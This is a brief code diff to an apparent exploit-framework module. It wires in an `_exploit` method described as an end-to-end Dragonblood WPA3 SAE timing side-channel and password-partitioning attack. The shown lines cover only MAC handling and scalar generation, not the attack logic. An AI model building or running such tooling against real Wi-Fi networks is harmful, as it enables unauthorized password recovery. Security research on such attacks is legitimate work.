@@ -187,6 +187,14 @@ class Exploit(Exploit):
             print_error("Invalid station MAC")
             return
 
+        print_success("Validation passed; launching exploit ...")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: Dragonblood SAE timing side-channel + password partitioning."""
+        ap_mac = _parse_mac(self.target)
+        sta_mac = self._gen_sta_mac()
+
         print_info(f"Station MAC: {_mac_to_str(sta_mac)}")
 
         scalar = os.urandom(32)
